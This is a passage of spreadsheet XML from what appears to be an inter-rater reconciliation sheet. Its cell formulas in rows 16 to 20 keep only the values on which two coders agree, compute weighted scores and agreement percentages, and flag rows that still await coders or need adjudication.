        <f>IF(AND(Coder1!AE16&amp;""&lt;&gt;"",Coder1!AE16&amp;""=Coder2!AE16&amp;""),Coder1!AE16,"")</f>
        <v/>
      </c>
      <c r="AF16" s="14">
        <f>IF(AND(Coder1!AF16&amp;""&lt;&gt;"",Coder1!AF16&amp;""=Coder2!AF16&amp;""),Coder1!AF16,"")</f>
        <v/>
      </c>
      <c r="AG16" s="14">
        <f>IF(AND(Coder1!AG16&amp;""&lt;&gt;"",Coder1!AG16&amp;""=Coder2!AG16&amp;""),Coder1!AG16,"")</f>
        <v/>
      </c>
      <c r="AH16" s="14">
        <f>IF(AND(Coder1!AH16&amp;""&lt;&gt;"",Coder1!AH16&amp;""=Coder2!AH16&amp;""),Coder1!AH16,"")</f>
        <v/>
      </c>
      <c r="AI16" s="11">
        <f>IF(COUNT(E16:L16)=0,"",SUM(E16:L16))</f>
        <v/>
      </c>
      <c r="AJ16" s="11">
        <f>IF(AI16="","",N(E16)*3+N(F16)*2+N(G16)*2+N(H16)*2+N(I16)*2+N(J16)*3+N(K16)*3+N(L16)*3)</f>
        <v/>
      </c>
      <c r="AK16" s="11">
        <f>IF(AI16="","",COUNTIF(N16:AG16,1))</f>
        <v/>
      </c>
      <c r="AL16" s="11">
        <f>IF(OR(AJ16="",AJ16=0),"",ROUND(100*(AJ16-AK16)/AJ16,1))</f>
        <v/>
      </c>
      <c r="AM16" s="11">
        <f>IF(AND(Coder1!AN16=1,Coder2!AN16=1),IF(COUNTBLANK(E16:AH16)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN16" s="11">
        <f>IF(AND(Coder1!AN16=1,Coder2!AN16=1),IF(SUMPRODUCT(--(Coder1!E16:AH16&amp;""&lt;&gt;Coder2!E16:AH16&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO16" s="11" t="n"/>
    </row>
    <row r="17">
      <c r="A17" s="11">
        <f>Coder1!A17</f>
        <v/>
      </c>
      <c r="B17" s="11">
        <f>Coder1!B17</f>
        <v/>
      </c>
      <c r="C17" s="11">
        <f>Coder1!C17</f>
        <v/>
      </c>
      <c r="D17" s="11">
        <f>Coder1!D17</f>
        <v/>
      </c>
      <c r="E17" s="14">
        <f>IF(AND(Coder1!E17&amp;""&lt;&gt;"",Coder1!E17&amp;""=Coder2!E17&amp;""),Coder1!E17,"")</f>
        <v/>
      </c>
      <c r="F17" s="14">
        <f>IF(AND(Coder1!F17&amp;""&lt;&gt;"",Coder1!F17&amp;""=Coder2!F17&amp;""),Coder1!F17,"")</f>
        <v/>
      </c>
      <c r="G17" s="14">
        <f>IF(AND(Coder1!G17&amp;""&lt;&gt;"",Coder1!G17&amp;""=Coder2!G17&amp;""),Coder1!G17,"")</f>
        <v/>
      </c>
      <c r="H17" s="14">
        <f>IF(AND(Coder1!H17&amp;""&lt;&gt;"",Coder1!H17&amp;""=Coder2!H17&amp;""),Coder1!H17,"")</f>
        <v/>
      </c>
      <c r="I17" s="14">
        <f>IF(AND(Coder1!I17&amp;""&lt;&gt;"",Coder1!I17&amp;""=Coder2!I17&amp;""),Coder1!I17,"")</f>
        <v/>
      </c>
      <c r="J17" s="14">
        <f>IF(AND(Coder1!J17&amp;""&lt;&gt;"",Coder1!J17&amp;""=Coder2!J17&amp;""),Coder1!J17,"")</f>
        <v/>
      </c>
      <c r="K17" s="14">
        <f>IF(AND(Coder1!K17&amp;""&lt;&gt;"",Coder1!K17&amp;""=Coder2!K17&amp;""),Coder1!K17,"")</f>
        <v/>
      </c>
      <c r="L17" s="14">
        <f>IF(AND(Coder1!L17&amp;""&lt;&gt;"",Coder1!L17&amp;""=Coder2!L17&amp;""),Coder1!L17,"")</f>
        <v/>
      </c>
      <c r="M17" s="14">
        <f>IF(AND(Coder1!M17&amp;""&lt;&gt;"",Coder1!M17&amp;""=Coder2!M17&amp;""),Coder1!M17,"")</f>
        <v/>
      </c>
      <c r="N17" s="14">
        <f>IF(AND(Coder1!N17&amp;""&lt;&gt;"",Coder1!N17&amp;""=Coder2!N17&amp;""),Coder1!N17,"")</f>
        <v/>
      </c>
      <c r="O17" s="14">
        <f>IF(AND(Coder1!O17&amp;""&lt;&gt;"",Coder1!O17&amp;""=Coder2!O17&amp;""),Coder1!O17,"")</f>
        <v/>
      </c>
      <c r="P17" s="14">
        <f>IF(AND(Coder1!P17&amp;""&lt;&gt;"",Coder1!P17&amp;""=Coder2!P17&amp;""),Coder1!P17,"")</f>
        <v/>
      </c>
      <c r="Q17" s="14">
        <f>IF(AND(Coder1!Q17&amp;""&lt;&gt;"",Coder1!Q17&amp;""=Coder2!Q17&amp;""),Coder1!Q17,"")</f>
        <v/>
      </c>
      <c r="R17" s="14">
        <f>IF(AND(Coder1!R17&amp;""&lt;&gt;"",Coder1!R17&amp;""=Coder2!R17&amp;""),Coder1!R17,"")</f>
        <v/>
      </c>
      <c r="S17" s="14">
        <f>IF(AND(Coder1!S17&amp;""&lt;&gt;"",Coder1!S17&amp;""=Coder2!S17&amp;""),Coder1!S17,"")</f>
        <v/>
      </c>
      <c r="T17" s="14">
        <f>IF(AND(Coder1!T17&amp;""&lt;&gt;"",Coder1!T17&amp;""=Coder2!T17&amp;""),Coder1!T17,"")</f>
        <v/>
      </c>
      <c r="U17" s="14">
        <f>IF(AND(Coder1!U17&amp;""&lt;&gt;"",Coder1!U17&amp;""=Coder2!U17&amp;""),Coder1!U17,"")</f>
        <v/>
      </c>
      <c r="V17" s="14">
        <f>IF(AND(Coder1!V17&amp;""&lt;&gt;"",Coder1!V17&amp;""=Coder2!V17&amp;""),Coder1!V17,"")</f>
        <v/>
      </c>
      <c r="W17" s="14">
        <f>IF(AND(Coder1!W17&amp;""&lt;&gt;"",Coder1!W17&amp;""=Coder2!W17&amp;""),Coder1!W17,"")</f>
        <v/>
      </c>
      <c r="X17" s="14">
        <f>IF(AND(Coder1!X17&amp;""&lt;&gt;"",Coder1!X17&amp;""=Coder2!X17&amp;""),Coder1!X17,"")</f>
        <v/>
      </c>
      <c r="Y17" s="14">
        <f>IF(AND(Coder1!Y17&amp;""&lt;&gt;"",Coder1!Y17&amp;""=Coder2!Y17&amp;""),Coder1!Y17,"")</f>
        <v/>
      </c>
      <c r="Z17" s="14">
        <f>IF(AND(Coder1!Z17&amp;""&lt;&gt;"",Coder1!Z17&amp;""=Coder2!Z17&amp;""),Coder1!Z17,"")</f>
        <v/>
      </c>
      <c r="AA17" s="14">
        <f>IF(AND(Coder1!AA17&amp;""&lt;&gt;"",Coder1!AA17&amp;""=Coder2!AA17&amp;""),Coder1!AA17,"")</f>
        <v/>
      </c>
      <c r="AB17" s="14">
        <f>IF(AND(Coder1!AB17&amp;""&lt;&gt;"",Coder1!AB17&amp;""=Coder2!AB17&amp;""),Coder1!AB17,"")</f>
        <v/>
      </c>
      <c r="AC17" s="14">
        <f>IF(AND(Coder1!AC17&amp;""&lt;&gt;"",Coder1!AC17&amp;""=Coder2!AC17&amp;""),Coder1!AC17,"")</f>
        <v/>
      </c>
      <c r="AD17" s="14">
        <f>IF(AND(Coder1!AD17&amp;""&lt;&gt;"",Coder1!AD17&amp;""=Coder2!AD17&amp;""),Coder1!AD17,"")</f>
        <v/>
      </c>
      <c r="AE17" s="14">
        <f>IF(AND(Coder1!AE17&amp;""&lt;&gt;"",Coder1!AE17&amp;""=Coder2!AE17&amp;""),Coder1!AE17,"")</f>
        <v/>
      </c>
      <c r="AF17" s="14">
        <f>IF(AND(Coder1!AF17&amp;""&lt;&gt;"",Coder1!AF17&amp;""=Coder2!AF17&amp;""),Coder1!AF17,"")</f>
        <v/>
      </c>
      <c r="AG17" s="14">
        <f>IF(AND(Coder1!AG17&amp;""&lt;&gt;"",Coder1!AG17&amp;""=Coder2!AG17&amp;""),Coder1!AG17,"")</f>
        <v/>
      </c>
      <c r="AH17" s="14">
        <f>IF(AND(Coder1!AH17&amp;""&lt;&gt;"",Coder1!AH17&amp;""=Coder2!AH17&amp;""),Coder1!AH17,"")</f>
        <v/>
      </c>
      <c r="AI17" s="11">
        <f>IF(COUNT(E17:L17)=0,"",SUM(E17:L17))</f>
        <v/>
      </c>
      <c r="AJ17" s="11">
        <f>IF(AI17="","",N(E17)*3+N(F17)*2+N(G17)*2+N(H17)*2+N(I17)*2+N(J17)*3+N(K17)*3+N(L17)*3)</f>
        <v/>
      </c>
      <c r="AK17" s="11">
        <f>IF(AI17="","",COUNTIF(N17:AG17,1))</f>
        <v/>
      </c>
      <c r="AL17" s="11">
        <f>IF(OR(AJ17="",AJ17=0),"",ROUND(100*(AJ17-AK17)/AJ17,1))</f>
        <v/>
      </c>
      <c r="AM17" s="11">
        <f>IF(AND(Coder1!AN17=1,Coder2!AN17=1),IF(COUNTBLANK(E17:AH17)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN17" s="11">
        <f>IF(AND(Coder1!AN17=1,Coder2!AN17=1),IF(SUMPRODUCT(--(Coder1!E17:AH17&amp;""&lt;&gt;Coder2!E17:AH17&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO17" s="11" t="n"/>
    </row>
    <row r="18">
      <c r="A18" s="11">
        <f>Coder1!A18</f>
        <v/>
      </c>
      <c r="B18" s="11">
        <f>Coder1!B18</f>
        <v/>
      </c>
      <c r="C18" s="11">
        <f>Coder1!C18</f>
        <v/>
      </c>
      <c r="D18" s="11">
        <f>Coder1!D18</f>
        <v/>
      </c>
      <c r="E18" s="14">
        <f>IF(AND(Coder1!E18&amp;""&lt;&gt;"",Coder1!E18&amp;""=Coder2!E18&amp;""),Coder1!E18,"")</f>
        <v/>
      </c>
      <c r="F18" s="14">
        <f>IF(AND(Coder1!F18&amp;""&lt;&gt;"",Coder1!F18&amp;""=Coder2!F18&amp;""),Coder1!F18,"")</f>
        <v/>
      </c>
      <c r="G18" s="14">
        <f>IF(AND(Coder1!G18&amp;""&lt;&gt;"",Coder1!G18&amp;""=Coder2!G18&amp;""),Coder1!G18,"")</f>
        <v/>
      </c>
      <c r="H18" s="14">
        <f>IF(AND(Coder1!H18&amp;""&lt;&gt;"",Coder1!H18&amp;""=Coder2!H18&amp;""),Coder1!H18,"")</f>
        <v/>
      </c>
      <c r="I18" s="14">
        <f>IF(AND(Coder1!I18&amp;""&lt;&gt;"",Coder1!I18&amp;""=Coder2!I18&amp;""),Coder1!I18,"")</f>
        <v/>
      </c>
      <c r="J18" s="14">
        <f>IF(AND(Coder1!J18&amp;""&lt;&gt;"",Coder1!J18&amp;""=Coder2!J18&amp;""),Coder1!J18,"")</f>
        <v/>
      </c>
      <c r="K18" s="14">
        <f>IF(AND(Coder1!K18&amp;""&lt;&gt;"",Coder1!K18&amp;""=Coder2!K18&amp;""),Coder1!K18,"")</f>
        <v/>
      </c>
      <c r="L18" s="14">
        <f>IF(AND(Coder1!L18&amp;""&lt;&gt;"",Coder1!L18&amp;""=Coder2!L18&amp;""),Coder1!L18,"")</f>
        <v/>
      </c>
      <c r="M18" s="14">
        <f>IF(AND(Coder1!M18&amp;""&lt;&gt;"",Coder1!M18&amp;""=Coder2!M18&amp;""),Coder1!M18,"")</f>
        <v/>
      </c>
      <c r="N18" s="14">
        <f>IF(AND(Coder1!N18&amp;""&lt;&gt;"",Coder1!N18&amp;""=Coder2!N18&amp;""),Coder1!N18,"")</f>
        <v/>
      </c>
      <c r="O18" s="14">
        <f>IF(AND(Coder1!O18&amp;""&lt;&gt;"",Coder1!O18&amp;""=Coder2!O18&amp;""),Coder1!O18,"")</f>
        <v/>
      </c>
      <c r="P18" s="14">
        <f>IF(AND(Coder1!P18&amp;""&lt;&gt;"",Coder1!P18&amp;""=Coder2!P18&amp;""),Coder1!P18,"")</f>
        <v/>
      </c>
      <c r="Q18" s="14">
        <f>IF(AND(Coder1!Q18&amp;""&lt;&gt;"",Coder1!Q18&amp;""=Coder2!Q18&amp;""),Coder1!Q18,"")</f>
        <v/>
      </c>
      <c r="R18" s="14">
        <f>IF(AND(Coder1!R18&amp;""&lt;&gt;"",Coder1!R18&amp;""=Coder2!R18&amp;""),Coder1!R18,"")</f>
        <v/>
      </c>
      <c r="S18" s="14">
        <f>IF(AND(Coder1!S18&amp;""&lt;&gt;"",Coder1!S18&amp;""=Coder2!S18&amp;""),Coder1!S18,"")</f>
        <v/>
      </c>
      <c r="T18" s="14">
        <f>IF(AND(Coder1!T18&amp;""&lt;&gt;"",Coder1!T18&amp;""=Coder2!T18&amp;""),Coder1!T18,"")</f>
        <v/>
      </c>
      <c r="U18" s="14">
        <f>IF(AND(Coder1!U18&amp;""&lt;&gt;"",Coder1!U18&amp;""=Coder2!U18&amp;""),Coder1!U18,"")</f>
        <v/>
      </c>
      <c r="V18" s="14">
        <f>IF(AND(Coder1!V18&amp;""&lt;&gt;"",Coder1!V18&amp;""=Coder2!V18&amp;""),Coder1!V18,"")</f>
        <v/>
      </c>
      <c r="W18" s="14">
        <f>IF(AND(Coder1!W18&amp;""&lt;&gt;"",Coder1!W18&amp;""=Coder2!W18&amp;""),Coder1!W18,"")</f>
        <v/>
      </c>
      <c r="X18" s="14">
        <f>IF(AND(Coder1!X18&amp;""&lt;&gt;"",Coder1!X18&amp;""=Coder2!X18&amp;""),Coder1!X18,"")</f>
        <v/>
      </c>
      <c r="Y18" s="14">
        <f>IF(AND(Coder1!Y18&amp;""&lt;&gt;"",Coder1!Y18&amp;""=Coder2!Y18&amp;""),Coder1!Y18,"")</f>
        <v/>
      </c>
      <c r="Z18" s="14">
        <f>IF(AND(Coder1!Z18&amp;""&lt;&gt;"",Coder1!Z18&amp;""=Coder2!Z18&amp;""),Coder1!Z18,"")</f>
        <v/>
      </c>
      <c r="AA18" s="14">
        <f>IF(AND(Coder1!AA18&amp;""&lt;&gt;"",Coder1!AA18&amp;""=Coder2!AA18&amp;""),Coder1!AA18,"")</f>
        <v/>
      </c>
      <c r="AB18" s="14">
        <f>IF(AND(Coder1!AB18&amp;""&lt;&gt;"",Coder1!AB18&amp;""=Coder2!AB18&amp;""),Coder1!AB18,"")</f>
        <v/>
      </c>
      <c r="AC18" s="14">
        <f>IF(AND(Coder1!AC18&amp;""&lt;&gt;"",Coder1!AC18&amp;""=Coder2!AC18&amp;""),Coder1!AC18,"")</f>
        <v/>
      </c>
      <c r="AD18" s="14">
        <f>IF(AND(Coder1!AD18&amp;""&lt;&gt;"",Coder1!AD18&amp;""=Coder2!AD18&amp;""),Coder1!AD18,"")</f>
        <v/>
      </c>
      <c r="AE18" s="14">
        <f>IF(AND(Coder1!AE18&amp;""&lt;&gt;"",Coder1!AE18&amp;""=Coder2!AE18&amp;""),Coder1!AE18,"")</f>
        <v/>
      </c>
      <c r="AF18" s="14">
        <f>IF(AND(Coder1!AF18&amp;""&lt;&gt;"",Coder1!AF18&amp;""=Coder2!AF18&amp;""),Coder1!AF18,"")</f>
        <v/>
      </c>
      <c r="AG18" s="14">
        <f>IF(AND(Coder1!AG18&amp;""&lt;&gt;"",Coder1!AG18&amp;""=Coder2!AG18&amp;""),Coder1!AG18,"")</f>
        <v/>
      </c>
      <c r="AH18" s="14">
        <f>IF(AND(Coder1!AH18&amp;""&lt;&gt;"",Coder1!AH18&amp;""=Coder2!AH18&amp;""),Coder1!AH18,"")</f>
        <v/>
      </c>
      <c r="AI18" s="11">
        <f>IF(COUNT(E18:L18)=0,"",SUM(E18:L18))</f>
        <v/>
      </c>
      <c r="AJ18" s="11">
        <f>IF(AI18="","",N(E18)*3+N(F18)*2+N(G18)*2+N(H18)*2+N(I18)*2+N(J18)*3+N(K18)*3+N(L18)*3)</f>
        <v/>
      </c>
      <c r="AK18" s="11">
        <f>IF(AI18="","",COUNTIF(N18:AG18,1))</f>
        <v/>
      </c>
      <c r="AL18" s="11">
        <f>IF(OR(AJ18="",AJ18=0),"",ROUND(100*(AJ18-AK18)/AJ18,1))</f>
        <v/>
      </c>
      <c r="AM18" s="11">
        <f>IF(AND(Coder1!AN18=1,Coder2!AN18=1),IF(COUNTBLANK(E18:AH18)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN18" s="11">
        <f>IF(AND(Coder1!AN18=1,Coder2!AN18=1),IF(SUMPRODUCT(--(Coder1!E18:AH18&amp;""&lt;&gt;Coder2!E18:AH18&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO18" s="11" t="n"/>
    </row>
    <row r="19">
      <c r="A19" s="11">
        <f>Coder1!A19</f>
        <v/>
      </c>
      <c r="B19" s="11">
        <f>Coder1!B19</f>
        <v/>
      </c>
      <c r="C19" s="11">
        <f>Coder1!C19</f>
        <v/>
      </c>
      <c r="D19" s="11">
        <f>Coder1!D19</f>
        <v/>
      </c>
      <c r="E19" s="14">
        <f>IF(AND(Coder1!E19&amp;""&lt;&gt;"",Coder1!E19&amp;""=Coder2!E19&amp;""),Coder1!E19,"")</f>
        <v/>
      </c>
      <c r="F19" s="14">
        <f>IF(AND(Coder1!F19&amp;""&lt;&gt;"",Coder1!F19&amp;""=Coder2!F19&amp;""),Coder1!F19,"")</f>
        <v/>
      </c>
      <c r="G19" s="14">
        <f>IF(AND(Coder1!G19&amp;""&lt;&gt;"",Coder1!G19&amp;""=Coder2!G19&amp;""),Coder1!G19,"")</f>
        <v/>
      </c>
      <c r="H19" s="14">
        <f>IF(AND(Coder1!H19&amp;""&lt;&gt;"",Coder1!H19&amp;""=Coder2!H19&amp;""),Coder1!H19,"")</f>
        <v/>
      </c>
      <c r="I19" s="14">
        <f>IF(AND(Coder1!I19&amp;""&lt;&gt;"",Coder1!I19&amp;""=Coder2!I19&amp;""),Coder1!I19,"")</f>
        <v/>
      </c>
      <c r="J19" s="14">
        <f>IF(AND(Coder1!J19&amp;""&lt;&gt;"",Coder1!J19&amp;""=Coder2!J19&amp;""),Coder1!J19,"")</f>
        <v/>
      </c>
      <c r="K19" s="14">
        <f>IF(AND(Coder1!K19&amp;""&lt;&gt;"",Coder1!K19&amp;""=Coder2!K19&amp;""),Coder1!K19,"")</f>
        <v/>
      </c>
      <c r="L19" s="14">
        <f>IF(AND(Coder1!L19&amp;""&lt;&gt;"",Coder1!L19&amp;""=Coder2!L19&amp;""),Coder1!L19,"")</f>
        <v/>
      </c>
      <c r="M19" s="14">
        <f>IF(AND(Coder1!M19&amp;""&lt;&gt;"",Coder1!M19&amp;""=Coder2!M19&amp;""),Coder1!M19,"")</f>
        <v/>
      </c>
      <c r="N19" s="14">
        <f>IF(AND(Coder1!N19&amp;""&lt;&gt;"",Coder1!N19&amp;""=Coder2!N19&amp;""),Coder1!N19,"")</f>
        <v/>
      </c>
      <c r="O19" s="14">
        <f>IF(AND(Coder1!O19&amp;""&lt;&gt;"",Coder1!O19&amp;""=Coder2!O19&amp;""),Coder1!O19,"")</f>
        <v/>
      </c>
      <c r="P19" s="14">
        <f>IF(AND(Coder1!P19&amp;""&lt;&gt;"",Coder1!P19&amp;""=Coder2!P19&amp;""),Coder1!P19,"")</f>
        <v/>
      </c>
      <c r="Q19" s="14">
        <f>IF(AND(Coder1!Q19&amp;""&lt;&gt;"",Coder1!Q19&amp;""=Coder2!Q19&amp;""),Coder1!Q19,"")</f>
        <v/>
      </c>
      <c r="R19" s="14">
        <f>IF(AND(Coder1!R19&amp;""&lt;&gt;"",Coder1!R19&amp;""=Coder2!R19&amp;""),Coder1!R19,"")</f>
        <v/>
      </c>
      <c r="S19" s="14">
        <f>IF(AND(Coder1!S19&amp;""&lt;&gt;"",Coder1!S19&amp;""=Coder2!S19&amp;""),Coder1!S19,"")</f>
        <v/>
      </c>
      <c r="T19" s="14">
        <f>IF(AND(Coder1!T19&amp;""&lt;&gt;"",Coder1!T19&amp;""=Coder2!T19&amp;""),Coder1!T19,"")</f>
        <v/>
      </c>
      <c r="U19" s="14">
        <f>IF(AND(Coder1!U19&amp;""&lt;&gt;"",Coder1!U19&amp;""=Coder2!U19&amp;""),Coder1!U19,"")</f>
        <v/>
      </c>
      <c r="V19" s="14">
        <f>IF(AND(Coder1!V19&amp;""&lt;&gt;"",Coder1!V19&amp;""=Coder2!V19&amp;""),Coder1!V19,"")</f>
        <v/>
      </c>
      <c r="W19" s="14">
        <f>IF(AND(Coder1!W19&amp;""&lt;&gt;"",Coder1!W19&amp;""=Coder2!W19&amp;""),Coder1!W19,"")</f>
        <v/>
      </c>
      <c r="X19" s="14">
        <f>IF(AND(Coder1!X19&amp;""&lt;&gt;"",Coder1!X19&amp;""=Coder2!X19&amp;""),Coder1!X19,"")</f>
        <v/>
      </c>
      <c r="Y19" s="14">
        <f>IF(AND(Coder1!Y19&amp;""&lt;&gt;"",Coder1!Y19&amp;""=Coder2!Y19&amp;""),Coder1!Y19,"")</f>
        <v/>
      </c>
      <c r="Z19" s="14">
        <f>IF(AND(Coder1!Z19&amp;""&lt;&gt;"",Coder1!Z19&amp;""=Coder2!Z19&amp;""),Coder1!Z19,"")</f>
        <v/>
      </c>
      <c r="AA19" s="14">
        <f>IF(AND(Coder1!AA19&amp;""&lt;&gt;"",Coder1!AA19&amp;""=Coder2!AA19&amp;""),Coder1!AA19,"")</f>
        <v/>
      </c>
      <c r="AB19" s="14">
        <f>IF(AND(Coder1!AB19&amp;""&lt;&gt;"",Coder1!AB19&amp;""=Coder2!AB19&amp;""),Coder1!AB19,"")</f>
        <v/>
      </c>
      <c r="AC19" s="14">
        <f>IF(AND(Coder1!AC19&amp;""&lt;&gt;"",Coder1!AC19&amp;""=Coder2!AC19&amp;""),Coder1!AC19,"")</f>
        <v/>
      </c>
      <c r="AD19" s="14">
        <f>IF(AND(Coder1!AD19&amp;""&lt;&gt;"",Coder1!AD19&amp;""=Coder2!AD19&amp;""),Coder1!AD19,"")</f>
        <v/>
      </c>
      <c r="AE19" s="14">
        <f>IF(AND(Coder1!AE19&amp;""&lt;&gt;"",Coder1!AE19&amp;""=Coder2!AE19&amp;""),Coder1!AE19,"")</f>
        <v/>
      </c>
      <c r="AF19" s="14">
        <f>IF(AND(Coder1!AF19&amp;""&lt;&gt;"",Coder1!AF19&amp;""=Coder2!AF19&amp;""),Coder1!AF19,"")</f>
        <v/>
      </c>
      <c r="AG19" s="14">
        <f>IF(AND(Coder1!AG19&amp;""&lt;&gt;"",Coder1!AG19&amp;""=Coder2!AG19&amp;""),Coder1!AG19,"")</f>
        <v/>
      </c>
      <c r="AH19" s="14">
        <f>IF(AND(Coder1!AH19&amp;""&lt;&gt;"",Coder1!AH19&amp;""=Coder2!AH19&amp;""),Coder1!AH19,"")</f>
        <v/>
      </c>
      <c r="AI19" s="11">
        <f>IF(COUNT(E19:L19)=0,"",SUM(E19:L19))</f>
        <v/>
      </c>
      <c r="AJ19" s="11">
        <f>IF(AI19="","",N(E19)*3+N(F19)*2+N(G19)*2+N(H19)*2+N(I19)*2+N(J19)*3+N(K19)*3+N(L19)*3)</f>
        <v/>
      </c>
      <c r="AK19" s="11">
        <f>IF(AI19="","",COUNTIF(N19:AG19,1))</f>
        <v/>
      </c>
      <c r="AL19" s="11">
        <f>IF(OR(AJ19="",AJ19=0),"",ROUND(100*(AJ19-AK19)/AJ19,1))</f>
        <v/>
      </c>
      <c r="AM19" s="11">
        <f>IF(AND(Coder1!AN19=1,Coder2!AN19=1),IF(COUNTBLANK(E19:AH19)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN19" s="11">
        <f>IF(AND(Coder1!AN19=1,Coder2!AN19=1),IF(SUMPRODUCT(--(Coder1!E19:AH19&amp;""&lt;&gt;Coder2!E19:AH19&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO19" s="11" t="n"/>
    </row>
    <row r="20">
      <c r="A20" s="11">
        <f>Coder1!A20</f>
        <v/>
      </c>
      <c r="B20" s="11">
        <f>Coder1!B20</f>
        <v/>
      </c>
      <c r="C20" s="11">
        <f>Coder1!C20</f>
        <v/>
      </c>
      <c r="D20" s="11">
        <f>Coder1!D20</f>
        <v/>
      </c>
      <c r="E20" s="14">
        <f>IF(AND(Coder1!E20&amp;""&lt;&gt;"",Coder1!E20&amp;""=Coder2!E20&amp;""),Coder1!E20,"")</f>
        <v/>
      </c>
      <c r="F20" s="14">
        <f>IF(AND(Coder1!F20&amp;""&lt;&gt;"",Coder1!F20&amp;""=Coder2!F20&amp;""),Coder1!F20,"")</f>
        <v/>
      </c>
      <c r="G20" s="14">
        <f>IF(AND(Coder1!G20&amp;""&lt;&gt;"",Coder1!G20&amp;""=Coder2!G20&amp;""),Coder1!G20,"")</f>
        <v/>
      </c>
      <c r="H20" s="14">
        <f>IF(AND(Coder1!H20&amp;""&lt;&gt;"",Coder1!H20&amp;""=Coder2!H20&amp;""),Coder1!H20,"")</f>
        <v/>
      </c>
      <c r="I20" s="14">
        <f>IF(AND(Coder1!I20&amp;""&lt;&gt;"",Coder1!I20&amp;""=Coder2!I20&amp;""),Coder1!I20,"")</f>
        <v/>
      </c>
      <c r="J20" s="14">
        <f>IF(AND(Coder1!J20&amp;""&lt;&gt;"",Coder1!J20&amp;""=Coder2!J20&amp;""),Coder1!J20,"")</f>
        <v/>
      </c>
      <c r="K20" s="14">
        <f>IF(AND(Coder1!K20&amp;""&lt;&gt;"",Coder1!K20&amp;""=Coder2!K20&amp;""),Coder1!K20,"")</f>
        <v/>
      </c>
      <c r="L20" s="14">
        <f>IF(AND(Coder1!L20&amp;""&lt;&gt;"",Coder1!L20&amp;""=Coder2!L20&amp;""),Coder1!L20,"")</f>
        <v/>
      </c>
      <c r="M20" s="14">
        <f>IF(AND(Coder1!M20&amp;""&lt;&gt;"",Coder1!M20&amp;""=Coder2!M20&amp;""),Coder1!M20,"")</f>
        <v/>
      </c>
      <c r="N20" s="14">
        <f>IF(AND(Coder1!N20&amp;""&lt;&gt;"",Coder1!N20&amp;""=Coder2!N20&amp;""),Coder1!N20,"")</f>
        <v/>
      </c>
      <c r="O20" s="14">
        <f>IF(AND(Coder1!O20&amp;""&lt;&gt;"",Coder1!O20&amp;""=Coder2!O20&amp;""),Coder1!O20,"")</f>
        <v/>
      </c>
      <c r="P20" s="14">
        <f>IF(AND(Coder1!P20&amp;""&lt;&gt;"",Coder1!P20&amp;""=Coder2!P20&amp;""),Coder1!P20,"")</f>
        <v/>
      </c>
      <c r="Q20" s="14">
        <f>IF(AND(Coder1!Q20&amp;""&lt;&gt;"",Coder1!Q20&amp;""=Coder2!Q20&amp;""),Coder1!Q20,"")</f>
        <v/>
      </c>
      <c r="R20" s="14">
        <f>IF(AND(Coder1!R20&amp;""&lt;&gt;"",Coder1!R20&amp;""=Coder2!R20&amp;""),Coder1!R20,"")</f>
        <v/>
      </c>
      <c r="S20" s="14">
        <f>IF(AND(Coder1!S20&amp;""&lt;&gt;"",Coder1!S20&amp;""=Coder2!S20&amp;""),Coder1!S20,"")</f>
        <v/>
      </c>
      <c r="T20" s="14">
        <f>IF(AND(Coder1!T20&amp;""&lt;&gt;"",Coder1!T20&amp;""=Coder2!T20&amp;""),Coder1!T20,"")</f>
        <v/>
      </c>
      <c r="U20" s="14">
        <f>IF(AND(Coder1!U20&amp;""&lt;&gt;"",Coder1!U20&amp;""=Coder2!U20&amp;""),Coder1!U20,"")</f>
        <v/>
      </c>
      <c r="V20" s="14">
        <f>IF(AND(Coder1!V20&amp;""&lt;&gt;"",Coder1!V20&amp;""=Coder2!V20&amp;""),Coder1!V20,"")</f>
        <v/>
      </c>
      <c r="W20" s="14">
        <f>IF(AND(Coder1!W20&amp;""&lt;&gt;"",Coder1!W20&amp;""=Coder2!W20&amp;""),Coder1!W20,"")</f>
        <v/>
      </c>
      <c r="X20" s="14">
        <f>IF(AND(Coder1!X20&amp;""&lt;&gt;"",Coder1!X20&amp;""=Coder2!X20&amp;""),Coder1!X20,"")</f>
        <v/>
      </c>
      <c r="Y20" s="14">
        <f>IF(AND(Coder1!Y20&amp;""&lt;&gt;"",Coder1!Y20&amp;""=Coder2!Y20&amp;""),Coder1!Y20,"")</f>
        <v/>
      </c>
      <c r="Z20" s="14">
        <f>IF(AND(Coder1!Z20&amp;""&lt;&gt;"",Coder1!Z20&amp;""=Coder2!Z20&amp;""),Coder1!Z20,"")</f>
        <v/>
      </c>
      <c r="AA20" s="14">
        <f>IF(AND(Coder1!AA20&amp;""&lt;&gt;"",Coder1!AA20&amp;""=Coder2!AA20&amp;""),Coder1!AA20,"")</f>
        <v/>
      </c>
      <c r="AB20" s="14">
        <f>IF(AND(Coder1!AB20&amp;""&lt;&gt;"",Coder1!AB20&amp;""=Coder2!AB20&amp;""),Coder1!AB20,"")</f>
        <v/>
      </c>
      <c r="AC20" s="14">
        <f>IF(AND(Coder1!AC20&amp;""&lt;&gt;"",Coder1!AC20&amp;""=Coder2!AC20&amp;""),Coder1!AC20,"")</f>
        <v/>
      </c>
      <c r="AD20" s="14">
        <f>IF(AND(Coder1!AD20&amp;""&lt;&gt;"",Coder1!AD20&amp;""=Coder2!AD20&amp;""),Coder1!AD20,"")</f>
        <v/>
      </c>
      <c r="AE20" s="14">
        <f>IF(AND(Coder1!AE20&amp;""&lt;&gt;"",Coder1!AE20&amp;""=Coder2!AE20&amp;""),Coder1!AE20,"")</f>
        <v/>
      </c>
      <c r="AF20" s="14">
        <f>IF(AND(Coder1!AF20&amp;""&lt;&gt;"",Coder1!AF20&amp;""=Coder2!AF20&amp;""),Coder1!AF20,"")</f>
        <v/>
      </c>
      <c r="AG20" s="14">
        <f>IF(AND(Coder1!AG20&amp;""&lt;&gt;"",Coder1!AG20&amp;""=Coder2!AG20&amp;""),Coder1!AG20,"")</f>
        <v/>
      </c>
      <c r="AH20" s="14">
